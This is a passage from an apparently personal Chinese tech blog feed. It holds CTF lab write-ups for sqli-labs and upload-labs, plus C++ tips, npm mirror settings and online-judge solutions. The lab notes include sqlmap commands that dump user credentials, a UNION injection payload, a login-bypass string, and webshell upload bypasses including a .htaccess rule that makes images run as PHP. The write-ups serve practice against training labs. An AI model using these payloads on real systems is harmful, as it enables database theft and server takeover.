&quot;http://6ff3dacb-9470-4d75-bc2b-49036315bc99.node3.buuoj.cn/Less-5/?id=1&quot; -D &quot;security&quot; --tables --level=3 --batch</code></p><p>&emsp;&emsp;3.<code>sqlmap -u &quot;http://6ff3dacb-9470-4d75-bc2b-49036315bc99.node3.buuoj.cn/Less-5/?id=1&quot; -D &quot;security&quot; -T &quot;users&quot; --columns --level=3 --batch</code></p><p>&emsp;&emsp;4.<code>sqlmap -u &quot;http://6ff3dacb-9470-4d75-bc2b-49036315bc99.node3.buuoj.cn/Less-5/?id=1&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump --level=3 --batch</code>将数据dump下来就行了，不知道为啥第五关藏着这么难的。</p><h3 id="less-6"><a href="#less-6" class="headerlink" title="less - 6"></a>less - 6</h3><p>&emsp;&emsp;输入双引号，报错内容为<code>to use near &#39;&quot;1&quot;&quot; LIMIT 0,1&#39; at line 1</code>跟第三关类似，直接更改第三关的payload就行了。paykoad为：<code>?id=-1&quot; union select 1,group_concat(concat_ws(&quot;---&quot;,username,password)),3 from users --+</code>但是还是只出来个<code>you are in</code>，应该还是类似第五题的注入方式，看wp也是看得一头雾水。还是用sqlmap跑跑吧，跟上一关一样的操作，最后一步的payload为：<code>sqlmap -u &quot;http://6ff3dacb-9470-4d75-bc2b-49036315bc99.node3.buuoj.cn/Less-6/?id=1&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump --level=3 --batch</code>。</p><h3 id="less-7"><a href="#less-7" class="headerlink" title="less - 7"></a>less - 7</h3><p>&emsp;&emsp;1.终于有一关可以看得懂了，害，太难了。输入<code>?id=1&#39;)) --+</code>，回显<code>You are in.... Use outfile......</code>,wp上说，这是文件写入的提示。。。</p><p>&emsp;&emsp;2.然后这个语句可以查看是否有写入文件的权限，<code>?id=1&#39;)) and (select count(*)%20 from mysql.user)&gt;0 --+</code>，结果回显正常，说明有写入文件的权限。。。</p><p>&emsp;&emsp;后面尝试了好多次，没有成功，比单纯的前十关的upload难多了感觉。不试了，有时间再做。</p><h3 id="less-8"><a href="#less-8" class="headerlink" title="less - 8"></a>less - 8</h3><p>&emsp;&emsp;跟第七关类似，没有解出来。用sqlmap跑还是没有跑出来，可能是我的sqlmap的版本太低了。盲注这一块这么难，我直接放弃(-_-)。</p><h3 id="less-9"><a href="#less-9" class="headerlink" title="less - 9"></a>less - 9</h3><p>&emsp;&emsp;用SQlmap跑的，有两种注入方式。<code>时间</code>，<code>布尔</code>。</p><h3 id="less-10"><a href="#less-10" class="headerlink" title="less -10"></a>less -10</h3><p>&emsp;&emsp;跟第九题类似的注入方式，用sqlmap完美解决问题。get类型的第一关就到这里了，我唯一熟练的就只是字符型，还有数字型的联合查询注入了，毕竟，我只是一只菜狗。</p><h3 id="less-11"><a href="#less-11" class="headerlink" title="less - 11"></a>less - 11</h3><p>&emsp;&emsp;从这一关，开始是post的注入问题了，应该会从最简单的开始。<br>&emsp;&emsp;输入万能密码<code>admin&#39; or &#39;1&#39;=&#39;1</code>,回显<code>username</code>与<code>password</code>就是<code>admin</code>和<code>admin</code>。然后用get里类似的语句，明天再学学吧。</p><p>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++的小技巧</title>
      <link href="/2020/02/19/c++%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2020/02/19/c++%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="只是小技巧"><a href="#只是小技巧" class="headerlink" title="只是小技巧"></a>只是小技巧</h1><p>1.<code>cin.getline()</code>是将接下来输入的一行的信息给录入进去；而<code>cin&gt;&gt;</code>是将接下来的一个数据录入进去，以空格、回车、tab作为结束标志。<br>2.cin.getline(<code>变量名</code>，<code>获取长度</code>)</p><a id="more"></a><p>3.不使用<code>round()</code>函数实现四舍五入的代码，<code>cout&lt;&lt;(int)(a+0.5)&lt;&lt;endl;</code><br>4.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(y &lt; <span class="number">10</span>)&#123; </span><br><span class="line">   var = <span class="number">30</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   var = <span class="number">40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码实现的效果类似于下面的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var = (y &lt; <span class="number">10</span>) ? <span class="number">30</span> : <span class="number">40</span>;</span><br></pre></td></tr></table></figure><p>5.对于一个字符的ASCII码值，可以直接使用<code>int(字符)</code>，也可使用<code>字符+0</code>。<br>6.对于一个ASCII码值对应的字符，可以直接使用<code>char(ASCII码值)</code>。<br>7.设n是非负整数，则<code>cout&lt;&lt;hex&lt;&lt;n;</code>显示n的十六进制形式。<br>8.<a href="https://www.jianshu.com/p/59f506ba5d11" target="_blank" rel="noopener">简书·某前辈的关于C++常见笔试题的总结</a><br>9.动态申请二维数组的方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态申请二维数组</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">   <span class="keyword">int</span> **a;  <span class="comment">//指向指针的指针 </span></span><br><span class="line">   <span class="keyword">int</span> n,m;<span class="comment">//n行 m列 </span></span><br><span class="line">   <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m; <span class="comment">//输入行数和列数</span></span><br><span class="line">     </span><br><span class="line">   <span class="comment">//申请空间</span></span><br><span class="line">   a= <span class="keyword">new</span> <span class="keyword">int</span> * [n];  <span class="comment">//n个 int 指针 数组</span></span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)    <span class="comment">//n个大小为m的一维数组</span></span><br><span class="line">   &#123;</span><br><span class="line">      a[i]=<span class="keyword">new</span> <span class="keyword">int</span>[m]; <span class="comment">//1个大小为m的一维数组，a[i]是int指针</span></span><br><span class="line">   &#125; </span><br><span class="line">     </span><br><span class="line">   <span class="comment">//输入数据</span></span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="comment">//cin&gt;&gt;a[i][j];//输入 </span></span><br><span class="line">         <span class="built_in">cin</span>&gt;&gt; *(*(a+i)+j);<span class="comment">//同上a相当于行指针 </span></span><br><span class="line">     </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//输出数据</span></span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="comment">//cout&lt;&lt;a[i][j]&lt;&lt;"\t";//输出 </span></span><br><span class="line">         <span class="built_in">cout</span>&lt;&lt; *(*(a+i)+j)&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">     </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//释放申请的空间！！！</span></span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="comment">//释放n个大小为m的一维数组</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">delete</span> []a[i]; </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">delete</span> []a;<span class="comment">//释放int指针数组</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> 小技巧 </tag>
            
            <tag> 新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2020/02/16/upload-labs/"/>
      <url>/2020/02/16/upload-labs/</url>
      
        <content type="html"><![CDATA[<h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><a id="more"></a><p>&emsp;&emsp;首先下载安装了一个蚁剑。<br>&emsp;&emsp;然后这一关是要用burpsuite抓包，然后修改<code>file name</code>，开始把一句话木马的后缀名改为<code>.gif</code>, 在<code>burpsuite</code>里修改后缀名为<code>.php</code><br>&emsp;&emsp;实现原理：因为这个文件名的审查是在前端。<br>&emsp;&emsp;使用蚁剑登录，发现我的文件已经上传到服务器了。</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p>&emsp;&emsp;打开第二关。<br>&emsp;&emsp;这一关对content-type进行了审查，并且只对进行了审查。<br>&emsp;&emsp;所以抓包，更改content-type的值为支持上传的<code>image/jpeg</code><br>&emsp;&emsp;使用蚁剑登录，可以连接到到服务器了。</p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>&emsp;&emsp;按照网上的教程成功上传到了服务器端。使用蚁剑连接不上去。<br>&emsp;&emsp;后缀名为.phtml的文件在apache服务器直接解析为php文件。<br>&emsp;&emsp;apache还有一个解析漏洞，就是这个服务器是对文件从后向前解析的，遇见看不懂的文件名直接跳过，直到碰到看得懂的文件名。<br>&emsp;&emsp;…… …… ……</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p>&emsp;&emsp;第四关也不知道怎么连上。<br>&emsp;&emsp;按照别人写的博客上传了一个后缀名为<code>.htaccess</code>的文件，内容为<code>AddType application/x-httpd-php .jpg</code>。<br>&emsp;&emsp;这样就可以直接将文件后缀名为<code>.jpg</code>的文件，解析为<code>.php</code>文件。<br>&emsp;&emsp;利用<code>antsword</code>连接<br>&emsp;&emsp;注意：<code>必须使用.htaccess</code>没有文件名，只有后缀名。</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p>&emsp;&emsp;后缀名大写绕过，上传的一句话木马的后缀名改为<code>hack.PHP</code>.<br>&emsp;&emsp;可以连接到后台了。<br>&emsp;&emsp;因为只过滤了小写的<code>.php</code>，并且没有将大写的字母转化为小写的<code>php语句</code>，从而可以实现通过大写的方法来绕过。<br>&emsp;&emsp;成功用<code>中国蚁剑</code>连接。</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p>&emsp;&emsp;这一关上传了一个<code>z.php</code>。然后在burp suite中，修改文件名为<code>z.php .</code>。<br>&emsp;&emsp;教程也看明白了，就是先去除这个点，然后再在服务端自动去除这个空格，从而实现上传<code>.php</code>文件的目的。<br>&emsp;&emsp;可是，传到服务端还是没有去掉<code>空格</code>，而是只去掉了末尾的<code>.</code><br>&emsp;&emsp;暂时算是半解决。</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p>&emsp;&emsp;这一关上传了一个<code>z.php</code>。然后在burp suite中，修改文件名为<code>z.php.</code>。<br>&emsp;&emsp;教程上面说，就是利用Windows系统的文件命名漏洞来去掉点？似乎不是，因为上传到后台的文件的后缀名还是<code>.php.</code>，所不同的是，这一次我用蚁剑连接上了后缀名为<code>.php.</code>的文件。<br>&emsp;&emsp;解决了！</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p>&emsp;&emsp;按教程加了<code>::$DATA</code>,没有连接上去。<br>&emsp;&emsp;文件名还是没有改变，最后的<code>::$DATA</code>被改为了<code>::$data</code>，也就是说只有大写被改为了小写，其他没啥变化，第二次没连上去。<br>&emsp;&emsp;(<em>_</em>)!</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p>&emsp;&emsp;加了<code>.[空格].</code>,没想到，在那边还是只去掉了<code>.</code>而对空格无动于衷。所以文件名就是类似这样的：<code>9.php.</code>。<br>&emsp;&emsp;尝试了几次，也没有连接上。可能还是那边的问题吧！<br>&emsp;&emsp;因为毕竟前几关都没有出错。</p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p>&emsp;&emsp;这里是将<code>黑名单后缀名</code>替换成了空字符，于是我们可以双写后缀名，如.pphphp,使得替换后的后缀名为php。从而实现绕过黑名单。<br>&emsp;&emsp;用蚁剑可以连接的上了，考虑前几关有几个没连上可能跟不是Windows有关。<br>&emsp;&emsp;这个第十关倒不是特别地难。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm切换到淘宝源</title>
      <link href="/2020/02/13/npm%E5%88%87%E6%8D%A2%E5%88%B0%E6%B7%98%E5%AE%9D%E6%BA%90/"/>
      <url>/2020/02/13/npm%E5%88%87%E6%8D%A2%E5%88%B0%E6%B7%98%E5%AE%9D%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h3 id="临时使用淘宝源"><a href="#临时使用淘宝源" class="headerlink" title="临时使用淘宝源"></a>临时使用淘宝源</h3><h4 id="npm-–registry-https-registry-npm-taobao-org-install-node-red-contrib-composer-latest"><a href="#npm-–registry-https-registry-npm-taobao-org-install-node-red-contrib-composer-latest" class="headerlink" title="npm –registry https://registry.npm.taobao.org install node-red-contrib-composer@latest"></a>npm –registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a> install node-red-contrib-composer@latest</h4><h3 id="全局配置切换到淘宝源"><a href="#全局配置切换到淘宝源" class="headerlink" title="全局配置切换到淘宝源"></a>全局配置切换到淘宝源</h3><a id="more"></a><h4 id="npm-config-set-registry-https-registry-npm-taobao-org"><a href="#npm-config-set-registry-https-registry-npm-taobao-org" class="headerlink" title="npm config set registry https://registry.npm.taobao.org"></a>npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></h4><h3 id="全局配置切换到官方源"><a href="#全局配置切换到官方源" class="headerlink" title="全局配置切换到官方源"></a>全局配置切换到官方源</h3><h4 id="npm-config-set-registry-http-www-npmjs-org"><a href="#npm-config-set-registry-http-www-npmjs-org" class="headerlink" title="npm config set registry http://www.npmjs.org"></a>npm config set registry <a href="http://www.npmjs.org" target="_blank" rel="noopener">http://www.npmjs.org</a></h4><h3 id="检测是否切换到了淘宝源"><a href="#检测是否切换到了淘宝源" class="headerlink" title="检测是否切换到了淘宝源"></a>检测是否切换到了淘宝源</h3><h4 id="npm-info-underscore"><a href="#npm-info-underscore" class="headerlink" title="npm info underscore"></a>npm info underscore</h4>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电OJ (c++)</title>
      <link href="/2020/02/12/%E6%9D%AD%E7%94%B5OJ%20(c++)/"/>
      <url>/2020/02/12/%E6%9D%AD%E7%94%B5OJ%20(c++)/</url>
      
        <content type="html"><![CDATA[<h2 id="持续更新ing"><a href="#持续更新ing" class="headerlink" title="持续更新ing"></a>持续更新ing</h2><h3 id="problem-1000"><a href="#problem-1000" class="headerlink" title="problem-1000"></a>problem-1000</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a + b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>&emsp;&emsp;开始的时候上传了7次都不对，后来核对的时候发现是因为没有循环的功能，就是只能完成一个例子。后来改了之后就行了。</p><h3 id="problem-1002"><a href="#problem-1002" class="headerlink" title="problem-1002"></a>problem-1002</h3><p>&emsp;&emsp;这个题目千万要注意输出的格式。终于把这个困住我好长时间的问题解决了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">con</span><span class="params">(<span class="built_in">string</span> a,<span class="built_in">string</span> b,<span class="keyword">int</span> c[<span class="number">1000</span>])</span></span>;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> m[<span class="number">21</span>];</span><br><span class="line">    <span class="built_in">string</span> sa[<span class="number">21</span>];</span><br><span class="line">    <span class="built_in">string</span> sb[<span class="number">21</span>];</span><br><span class="line">    <span class="keyword">int</span> sc[<span class="number">21</span>][<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;    <span class="comment">//输入有几组数据。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i &lt;= n;i++)</span><br><span class="line">    &#123;<span class="comment">//执行输入的功能。</span></span><br><span class="line">        <span class="keyword">int</span> c[<span class="number">1000</span>]=&#123;&#125;;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        sa[i] = a;</span><br><span class="line">        sb[i] = b;</span><br><span class="line">        m[i] = con(a,b,c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> f = m[i];f &gt;= <span class="number">0</span> ;f--)</span><br><span class="line">        &#123;</span><br><span class="line">            sc[i][f] = c[f];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i &lt;=n;i++)</span><br><span class="line">    &#123;<span class="comment">//执行输出，打印功能。</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; i &lt;&lt; <span class="string">":"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sa[i] &lt;&lt; <span class="string">" + "</span> &lt;&lt; sb[i] &lt;&lt; <span class="string">" = "</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> f = m[i];f &gt;= <span class="number">0</span> ;f--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; sc[i][f];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i != n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//我试了好多格式，只有这个ACCEPTED了。。。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算大数和的函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">con</span><span class="params">(<span class="built_in">string</span> a,<span class="built_in">string</span> b,<span class="keyword">int</span> c[<span class="number">1000</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = a.length();</span><br><span class="line">    <span class="keyword">int</span> len2 = b.length();</span><br><span class="line">    <span class="keyword">int</span> m = <span class="built_in">max</span>(len1,len2);</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">min</span>(len1,len2);</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> y[<span class="number">1000</span>];</span><br><span class="line">    reverse(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>());</span><br><span class="line">    reverse(b.<span class="built_in">begin</span>(),b.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        x[i] = a[i] - <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        y[i] = b[i] - <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j &lt; n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        c[j] = x[j] + y[j] + c[j];</span><br><span class="line">        <span class="keyword">if</span> (c[j] &gt; <span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            c[j+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">            c[j] = c[j] - <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            c[j+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (m == n &amp;&amp; c[n] == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = n;k &lt; m;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (len1 &gt; len2)</span><br><span class="line">        &#123;</span><br><span class="line">            c[k] = x[k] + c[k];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            c[k] = y[k] + c[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> m<span class="number">-1</span>;</span><br><span 